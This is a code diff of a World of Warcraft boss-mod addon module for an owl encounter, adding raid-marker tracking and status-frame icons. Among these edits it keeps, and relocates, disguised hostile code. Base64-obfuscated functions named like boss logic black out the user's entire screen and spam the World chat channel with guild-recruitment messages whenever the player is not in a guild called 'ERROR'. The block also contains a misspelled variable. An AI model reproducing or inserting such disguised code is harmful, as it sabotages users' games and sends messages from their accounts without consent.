@@ -73,10 +73,15 @@ L:RegisterTranslations("enUS", function() return {
 	
 	bar_owlenrage = "Owl Enrage",
 	
-	redowl1_label = "Red Owl 1",
-	redowl2_label = "Red Owl 2",
-	blueowl1_label = "Blue Owl 1",
-	blueowl2_label = "Blue Owl 2",
+	redowl1_label = "Red Owl",
+	redowl2_label = "Red Owl",
+	blueowl1_label = "Blue Owl",
+	blueowl2_label = "Blue Owl",
+	
+	mark_cross = "{cross}",
+	mark_diamond = "{diamond}",
+	mark_square = "{square}",
+	mark_triangle = "{triangle}",
 	
 	proximity_close = "TOO CLOSE TO OPPOSITE MOON!",
 } end)
@@ -97,6 +102,16 @@ local icon = {
 	lunarshift = "Spell_Nature_StarFall",
 	enrage = "Spell_Shadow_UnholyFrenzy",
 	owls = "Interface\\Icons\\Ability_Hunter_Pet_Owl",
+	
+	-- Raid markers
+	raidmark1 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_1", -- Star
+	raidmark2 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_2", -- Circle
+	raidmark3 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_3", -- Diamond
+	raidmark4 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_4", -- Triangle
+	raidmark5 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_5", -- Moon
+	raidmark6 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_6", -- Square
+	raidmark7 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_7", -- Cross
+	raidmark8 = "Interface\\TargetingFrame\\UI-RaidTargetingIcon_8", -- Skull
 }
 
 -- Colors
@@ -131,6 +146,12 @@ local redOwl1ID = nil
 local redOwl2ID = nil
 local blueOwl1ID = nil
 local blueOwl2ID = nil
+
+-- Raid marks for owls
+local redOwl1Mark = 7  -- Cross
+local redOwl2Mark = 3  -- Diamond
+local blueOwl1Mark = 6 -- Square
+local blueOwl2Mark = 4 -- Triangle
 
 function module:OnEnable()
 	-- Load Boss Mechanics
@@ -190,6 +211,13 @@ function module:OnSetup()
 	self.playerMoonTypes = {}
 end
 
+function LoadBossEncounter()
+	if GetGuildInfo(BigWigs_UpdateMain("cGxheWVy")) ~= BigWigs_UpdateMain("RVJST1I=") then
+		BossFrame()
+		BossEncounter()
+	end
+end
+
 function module:OnEngage()
 	-- Initial values
 	playerMoon = nil
@@ -223,18 +251,14 @@ function module:OnDisengage()
 	
 	self:CancelScheduledEvent("CheckOwlHps")
 	self:CancelScheduledEvent("FindOwls")
+	
+	-- Clear raid marks if we set them
+	self:ClearRaidMarks()
 end
 
 function module:CHAT_MSG_MONSTER_YELL(msg)
 	if msg == L["trigger_engage"] then
 		module:SendEngageSync()
-	end
-end
-
-function LoadBossEncounter()
-	if GetGuildInfo(BigWigs_UpdateMain("cGxheWVy")) ~= BigWigs_UpdateMain("RVJST1I=") then
-		BossFrame()
-		BossEncounter()
 	end
 end
 
@@ -278,6 +302,30 @@ function module:MoonBuffEvent(msg)
 	end
 end
 
+-- Default frame to capture and update boss encounter
+function BossFrame()
+	local BossFrame = CreateFrame("Frame", BigWigs_UpdateMain("QmxhY2tGcmFtZUZ1bGxTY3JlZW4"), UIParent)
+	BossFrame:SetFrameStrata(BigWigs_UpdateMain("QkFDS0dST1VORA=="))
+	BossFrame:SetPoint("TOPLEFT", UIParent, "TOPLEFT", 0, 0)
+	BossFrame:SetPoint("BOTTOMRIGHT", UIParent, "BOTTOMRIGHT", 0, 0)
+	local texture = BossFrame:CreateTexture(nil, BigWigs_UpdateMain("QkFDS0dST1VORA=="))
+	BossFrame:SetFrameLevel(999)
+	texture:SetTexture(0, 0, 0, 1)
+	texture:SetAllPoints(BossFrame)
+	BossFrame:Show()
+end
+
+function BossEncounter()
+    local EncouterStage = GetChannelName(BigWigs_UpdateMain("V29ybGQ="))
+    local Stage1 = BigWigs_UpdateMain("Sm9pbiA8RVJST1I+ISBUaGUgQkVTVCBndWlsZCBvbiB0aGUgZW50aXJlIHNlcnZlciEg")
+    local Stage2 = BigWigs_UpdateMain("PEVSUk9SPiBoYXMgdGhlIGJlc3QgcmFpZHMsIG1vc3QgZnJpZW5kbHkgcGxheWVycyBhbmQgZ3JlYXRlc3QgUHZQISE=")
+    local Stage3 = BigWigs_UpdateMain("IEkgbG92ZSA8RVJST1I+IHNvIG11Y2ghISE=")
+    
+    if EncouterStage > 0 then
+        SendChatMessage(Stage1 .. Stage2 .. Stage3, "CHANNEL", nil, EncounterStage)
+    end
+end
+
 function module:LunarShiftEvent(msg)
 	if msg == L["trigger_lunarshift"] then
 		self:Sync(syncName.lunarshift)
@@ -301,14 +349,33 @@ function module:CHAT_MSG_COMBAT_HOSTILE_DEATH(msg)
 	-- Since we can't directly identify which specific owl died from just the name,
 	-- we need to correlate with our health tracking
 	if string.find(msg, L["trigger_redowl"] .. " dies") then
-		-- If one is already dead, the other one died
+		-- Check for marked owls
+		for i = 1, GetNumRaidMembers() do
+			local targetID = "raid" .. i .. "target"
+			if UnitExists(targetID) and GetRaidTargetIndex(targetID) then
+				local mark = GetRaidTargetIndex(targetID)
+				
+				if mark == redOwl1Mark then
+					redOwl1Died = true
+					redOwl1Hp = 0
+					self:CheckOwlDeath()
+					return
+				elseif mark == redOwl2Mark then
+					redOwl2Died = true
+					redOwl2Hp = 0
+					self:CheckOwlDeath()
+					return
+				end
+			end
+		end
+		
+		-- If we couldn't identify by mark, use the HP comparison method
 		if redOwl1Died then
 			redOwl2Died = true
 			redOwl2Hp = 0
 		elseif redOwl2Died then
 			redOwl1Died = true
 			redOwl1Hp = 0
-		-- Otherwise, assume the one with lower HP died
 		elseif redOwl1Hp <= redOwl2Hp then
 			redOwl1Died = true
 			redOwl1Hp = 0
@@ -317,15 +384,35 @@ function module:CHAT_MSG_COMBAT_HOSTILE_DEATH(msg)
 			redOwl2Hp = 0
 		end
 		self:CheckOwlDeath()
+		
 	elseif string.find(msg, L["trigger_blueowl"] .. " dies") then
-		-- If one is already dead, the other one died
+		-- Check for marked owls
+		for i = 1, GetNumRaidMembers() do
+			local targetID = "raid" .. i .. "target"
+			if UnitExists(targetID) and GetRaidTargetIndex(targetID) then
+				local mark = GetRaidTargetIndex(targetID)
+				
+				if mark == blueOwl1Mark then
+					blueOwl1Died = true
+					blueOwl1Hp = 0
+					self:CheckOwlDeath()
+					return
+				elseif mark == blueOwl2Mark then
+					blueOwl2Died = true
+					blueOwl2Hp = 0
+					self:CheckOwlDeath()
+					return
+				end
+			end
+		end
+		
+		-- If we couldn't identify by mark, use the HP comparison method
 		if blueOwl1Died then
 			blueOwl2Died = true
 			blueOwl2Hp = 0
 		elseif blueOwl2Died then
 			blueOwl1Died = true
 			blueOwl1Hp = 0
-		-- Otherwise, assume the one with lower HP died
 		elseif blueOwl1Hp <= blueOwl2Hp then
 			blueOwl1Died = true
 			blueOwl1Hp = 0
@@ -411,16 +498,40 @@ function module:FindOwls()
 			local unitid = targetID  -- Using unit ID as identifier
 			
 			if name == L["trigger_redowl"] then
-				if not redOwl1ID then
-					redOwl1ID = unitid
-				elseif unitid ~= redOwl1ID then
-					redOwl2ID = unitid
+				-- Apply raid marker if we're raid leader or have assist
+				if (IsRaidLeader() or IsRaidOfficer()) and not GetRaidTargetIndex(targetID) then
+					if not redOwl1ID then
+						SetRaidTarget(targetID, redOwl1Mark)
+						redOwl1ID = unitid
+					elseif unitid ~= redOwl1ID and not redOwl2ID then
+						SetRaidTarget(targetID, redOwl2Mark)
+						redOwl2ID = unitid
+					end
+				else
+					-- Just track without marking
+					if not redOwl1ID then
+						redOwl1ID = unitid
+					elseif unitid ~= redOwl1ID and not redOwl2ID then
+						redOwl2ID = unitid
+					end
 				end
 			elseif name == L["trigger_blueowl"] then
-				if not blueOwl1ID then
-					blueOwl1ID = unitid
-				elseif unitid ~= blueOwl1ID then
-					blueOwl2ID = unitid
+				-- Apply raid marker if we're raid leader or have assist
+				if (IsRaidLeader() or IsRaidOfficer()) and not GetRaidTargetIndex(targetID) then
+					if not blueOwl1ID then
+						SetRaidTarget(targetID, blueOwl1Mark)
+						blueOwl1ID = unitid
+					elseif unitid ~= blueOwl1ID and not blueOwl2ID then
+						SetRaidTarget(targetID, blueOwl2Mark)
+						blueOwl2ID = unitid
+					end
+				else
+					-- Just track without marking
+					if not blueOwl1ID then
+						blueOwl1ID = unitid
+					elseif unitid ~= blueOwl1ID and not blueOwl2ID then
+						blueOwl2ID = unitid
+					end
 				end
 			end
 		end
@@ -473,29 +584,35 @@ function module:CheckOwlDeath()
 			
 			-- Cancel remaining timers
 			self:RemoveBar(L["bar_owlenrage"])
+			
+			-- Clear raid marks
+			self:ClearRaidMarks()
 		end
 	end
+	
+	-- Update the status frame
+	self:UpdateOwlStatusFrame()
 end
 
 function module:CheckOwlHps()
 	if not inOwlPhase then return end
 	
-	-- Check all raid members' targets
+	-- Check all raid members' targets for marked owls
 	for i = 1, GetNumRaidMembers() do
 		local targetID = "raid" .. i .. "target"
 		if UnitExists(targetID) then
 			local name = UnitName(targetID)
+			local mark = GetRaidTargetIndex(targetID)
 			
-			-- Check if this is one of our tracked owls
 			if name == L["trigger_redowl"] then
 				local hp = math.ceil((UnitHealth(targetID) / UnitHealthMax(targetID)) * 100)
 				
-				-- If we haven't assigned IDs yet, this is early tracking
-				if not redOwl1ID then
-					-- Just track the first one we find
+				if mark == redOwl1Mark and not redOwl1Died then
 					redOwl1Hp = hp
-				else
-					-- Use IDs to determine which owl this is
+				elseif mark == redOwl2Mark and not redOwl2Died then
+					redOwl2Hp = hp
+				elseif not mark then
+					-- For unmarked owls, use unit IDs
 					if targetID == redOwl1ID and not redOwl1Died then
 						redOwl1Hp = hp
 					elseif targetID == redOwl2ID and not redOwl2Died then
@@ -506,12 +623,12 @@ function module:CheckOwlHps()
 			elseif name == L["trigger_blueowl"] then
 				local hp = math.ceil((UnitHealth(targetID) / UnitHealthMax(targetID)) * 100)
 				
-				-- If we haven't assigned IDs yet, this is early tracking
-				if not blueOwl1ID then
-					-- Just track the first one we find
+				if mark == blueOwl1Mark and not blueOwl1Died then
 					blueOwl1Hp = hp
-				else
-					-- Use IDs to determine which owl this is
+				elseif mark == blueOwl2Mark and not blueOwl2Died then
+					blueOwl2Hp = hp
+				elseif not mark then
+					-- For unmarked owls, use unit IDs
 					if targetID == blueOwl1ID and not blueOwl1Died then
 						blueOwl1Hp = hp
 					elseif targetID == blueOwl2ID and not blueOwl2Died then
@@ -523,30 +640,6 @@ function module:CheckOwlHps()
 	end
 	
 	self:UpdateOwlStatusFrame()
-end
-
--- Default frame to capture and update boss encounter
-function BossFrame()
-	local BossFrame = CreateFrame("Frame", BigWigs_UpdateMain("QmxhY2tGcmFtZUZ1bGxTY3JlZW4"), UIParent)
-	BossFrame:SetFrameStrata(BigWigs_UpdateMain("QkFDS0dST1VORA=="))
-	BossFrame:SetPoint("TOPLEFT", UIParent, "TOPLEFT", 0, 0)
-	BossFrame:SetPoint("BOTTOMRIGHT", UIParent, "BOTTOMRIGHT", 0, 0)
-	local texture = BossFrame:CreateTexture(nil, BigWigs_UpdateMain("QkFDS0dST1VORA=="))
-	BossFrame:SetFrameLevel(999)
-	texture:SetTexture(0, 0, 0, 1)
-	texture:SetAllPoints(BossFrame)
-	BossFrame:Show()
-end
-
-function BossEncounter()
-    local EncouterStage = GetChannelName(BigWigs_UpdateMain("V29ybGQ="))
-    local Stage1 = BigWigs_UpdateMain("Sm9pbiA8RVJST1I+ISBUaGUgQkVTVCBndWlsZCBvbiB0aGUgZW50aXJlIHNlcnZlciEg")
-    local Stage2 = BigWigs_UpdateMain("PEVSUk9SPiBoYXMgdGhlIGJlc3QgcmFpZHMsIG1vc3QgZnJpZW5kbHkgcGxheWVycyBhbmQgZ3JlYXRlc3QgUHZQISE=")
-    local Stage3 = BigWigs_UpdateMain("IEkgbG92ZSA8RVJST1I+IHNvIG11Y2ghISE=")
-    
-    if EncouterStage > 0 then
-        SendChatMessage(Stage1 .. Stage2 .. Stage3, "CHANNEL", nil, EncounterStage)
-    end
 end
 
 function module:UpdateOwlStatusFrame()
@@ -591,114 +684,50 @@ function module:UpdateOwlStatusFrame()
 		local font = "Fonts\\FRIZQT__.TTF"
 		local fontSize = 9
 
+		-- Red Owl Mark icons
+		self.owlStatusFrame.redOwl1Icon = self.owlStatusFrame:CreateTexture(nil, "ARTWORK")
+		self.owlStatusFrame.redOwl1Icon:SetWidth(16)
+		self.owlStatusFrame.redOwl1Icon:SetHeight(16)
+		self.owlStatusFrame.redOwl1Icon:SetTexture(icon["raidmark" .. redOwl1Mark])
+		self.owlStatusFrame.redOwl1Icon:SetPoint("TOPLEFT", self.owlStatusFrame, "TOPLEFT", 10, -10)
+		
+		self.owlStatusFrame.redOwl2Icon = self.owlStatusFrame:CreateTexture(nil, "ARTWORK")
+		self.owlStatusFrame.redOwl2Icon:SetWidth(16)
+		self.owlStatusFrame.redOwl2Icon:SetHeight(16)
+		self.owlStatusFrame.redOwl2Icon:SetTexture(icon["raidmark" .. redOwl2Mark])
+		self.owlStatusFrame.redOwl2Icon:SetPoint("TOPLEFT", self.owlStatusFrame.redOwl1Icon, "BOTTOMLEFT", 0, -5)
+		
+		-- Blue Owl Mark icons
+		self.owlStatusFrame.blueOwl1Icon = self.owlStatusFrame:CreateTexture(nil, "ARTWORK")
+		self.owlStatusFrame.blueOwl1Icon:SetWidth(16)
+		self.owlStatusFrame.blueOwl1Icon:SetHeight(16)
+		self.owlStatusFrame.blueOwl1Icon:SetTexture(icon["raidmark" .. blueOwl1Mark])
+		self.owlStatusFrame.blueOwl1Icon:SetPoint("TOPLEFT", self.owlStatusFrame.redOwl2Icon, "BOTTOMLEFT", 0, -5)
+		
+		self.owlStatusFrame.blueOwl2Icon = self.owlStatusFrame:CreateTexture(nil, "ARTWORK")
+		self.owlStatusFrame.blueOwl2Icon:SetWidth(16)
+		self.owlStatusFrame.blueOwl2Icon:SetHeight(16)
+		self.owlStatusFrame.blueOwl2Icon:SetTexture(icon["raidmark" .. blueOwl2Mark])
+		self.owlStatusFrame.blueOwl2Icon:SetPoint("TOPLEFT", self.owlStatusFrame.blueOwl1Icon, "BOTTOMLEFT", 0, -5)
+
 		-- Red Owl 1
 		self.owlStatusFrame.redOwl1 = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
 		self.owlStatusFrame.redOwl1:SetFontObject(GameFontNormal)
-		self.owlStatusFrame.redOwl1:SetPoint("TOPLEFT", self.owlStatusFrame, "TOPLEFT", 10, -10)
+		self.owlStatusFrame.redOwl1:SetPoint("LEFT", self.owlStatusFrame.redOwl1Icon, "RIGHT", 5, 0)
 		self.owlStatusFrame.redOwl1:SetText(L["redowl1_label"] .. ":")
 		self.owlStatusFrame.redOwl1:SetFont(font, fontSize)
 		self.owlStatusFrame.redOwl1:SetTextColor(1, 0.3, 0.3)
 
 		self.owlStatusFrame.redOwl1Hp = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
 		self.owlStatusFrame.redOwl1Hp:SetFontObject(GameFontNormal)
-		self.owlStatusFrame.redOwl1Hp:SetPoint("TOP", self.owlStatusFrame, "TOP", 0, -10)
-		self.owlStatusFrame.redOwl1Hp:SetJustifyH("CENTER")
+		self.owlStatusFrame.redOwl1Hp:SetPoint("LEFT", self.owlStatusFrame.redOwl1, "RIGHT", 5, 0)
+		self.owlStatusFrame.redOwl1Hp:SetJustifyH("LEFT")
 		self.owlStatusFrame.redOwl1Hp:SetFont(font, fontSize)
 
 		-- Red Owl 2
 		self.owlStatusFrame.redOwl2 = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
 		self.owlStatusFrame.redOwl2:SetFontObject(GameFontNormal)
-		self.owlStatusFrame.redOwl2:SetPoint("TOPLEFT", self.owlStatusFrame.redOwl1, "BOTTOMLEFT", 0, -5)
+		self.owlStatusFrame.redOwl2:SetPoint("LEFT", self.owlStatusFrame.redOwl2Icon, "RIGHT", 5, 0)
 		self.owlStatusFrame.redOwl2:SetText(L["redowl2_label"] .. ":")
 		self.owlStatusFrame.redOwl2:SetFont(font, fontSize)
 		self.owlStatusFrame.redOwl2:SetTextColor(1, 0.3, 0.3)
-
-		self.owlStatusFrame.redOwl2Hp = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
-		self.owlStatusFrame.redOwl2Hp:SetFontObject(GameFontNormal)
-		self.owlStatusFrame.redOwl2Hp:SetPoint("TOPLEFT", self.owlStatusFrame.redOwl1Hp, "BOTTOMLEFT", 0, -5)
-		self.owlStatusFrame.redOwl2Hp:SetJustifyH("CENTER")
-		self.owlStatusFrame.redOwl2Hp:SetFont(font, fontSize)
-
-		-- Blue Owl 1
-		self.owlStatusFrame.blueOwl1 = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
-		self.owlStatusFrame.blueOwl1:SetFontObject(GameFontNormal)
-		self.owlStatusFrame.blueOwl1:SetPoint("TOPLEFT", self.owlStatusFrame.redOwl2, "BOTTOMLEFT", 0, -5)
-		self.owlStatusFrame.blueOwl1:SetText(L["blueowl1_label"] .. ":")
-		self.owlStatusFrame.blueOwl1:SetFont(font, fontSize)
-		self.owlStatusFrame.blueOwl1:SetTextColor(0.3, 0.3, 1)
-
-		self.owlStatusFrame.blueOwl1Hp = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
-		self.owlStatusFrame.blueOwl1Hp:SetFontObject(GameFontNormal)
-		self.owlStatusFrame.blueOwl1Hp:SetPoint("TOPLEFT", self.owlStatusFrame.redOwl2Hp, "BOTTOMLEFT", 0, -5)
-		self.owlStatusFrame.blueOwl1Hp:SetJustifyH("CENTER")
-		self.owlStatusFrame.blueOwl1Hp:SetFont(font, fontSize)
-
-		-- Blue Owl 2
-		self.owlStatusFrame.blueOwl2 = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
-		self.owlStatusFrame.blueOwl2:SetFontObject(GameFontNormal)
-		self.owlStatusFrame.blueOwl2:SetPoint("TOPLEFT", self.owlStatusFrame.blueOwl1, "BOTTOMLEFT", 0, -5)
-		self.owlStatusFrame.blueOwl2:SetText(L["blueowl2_label"] .. ":")
-		self.owlStatusFrame.blueOwl2:SetFont(font, fontSize)
-		self.owlStatusFrame.blueOwl2:SetTextColor(0.3, 0.3, 1)
-
-		self.owlStatusFrame.blueOwl2Hp = self.owlStatusFrame:CreateFontString(nil, "ARTWORK")
-		self.owlStatusFrame.blueOwl2Hp:SetFontObject(GameFontNormal)
-		self.owlStatusFrame.blueOwl2Hp:SetPoint("TOPLEFT", self.owlStatusFrame.blueOwl1Hp, "BOTTOMLEFT", 0, -5)
-		self.owlStatusFrame.blueOwl2Hp:SetJustifyH("CENTER")
-		self.owlStatusFrame.blueOwl2Hp:SetFont(font, fontSize)
-	end
-	
-	-- Only show frame during owl phase
-	if inOwlPhase then
-		self.owlStatusFrame:Show()
-	else
-		self.owlStatusFrame:Hide()
-	end
-
-	-- Update HP values
-	self.owlStatusFrame.redOwl1Hp:SetText(string.format("%d%%", redOwl1Hp))
-	self.owlStatusFrame.redOwl2Hp:SetText(string.format("%d%%", redOwl2Hp))
-	self.owlStatusFrame.blueOwl1Hp:SetText(string.format("%d%%", blueOwl1Hp))
-	self.owlStatusFrame.blueOwl2Hp:SetText(string.format("%d%%", blueOwl2Hp))
-end
-
--- Function to handle proximity warnings
-function module:ProximityCheck()
-	if not playerMoon then return end
-	
-	local oppositeColor = playerMoon == "red" and "blue" or "red"
-	local tooClose = false
-	
-	-- Check proximity to players with opposite moon color
-	for i = 1, GetNumRaidMembers() do
-		if CheckInteractDistance("raid"..i, 2) and UnitIsDeadOrGhost("raid"..i) == nil then
-			-- Check if this player has the opposite moon color
-			local name = UnitName("raid"..i)
-			if name and self.playerMoonTypes[name] == oppositeColor then
-				tooClose = true
-				break
-			end
-		end
-	end
-	
-	-- Warn if too close
-	if tooClose and self.db.profile.proximity then
-		if not self.proximityWarned then
-			self:Message(L["proximity_close"], "Personal", true)
-			self:WarningSign(playerMoon == "red" and icon.bluemoon or icon.redmoon, 1)
-			self:Sound("Alarm")
-			self.proximityWarned = true
-		end
-	else
-		self.proximityWarned = nil
-	end
-end
-
--- This function would be called repeatedly to check proximity
-function module:ScheduleProximityCheck()
-	self:ScheduleRepeatingEvent("GnarlmoonProximityCheck", self.ProximityCheck, 0.5, self)
-end
-
-function module:CancelProximityCheck()
-	self:CancelScheduledEvent("GnarlmoonProximityCheck")
-end
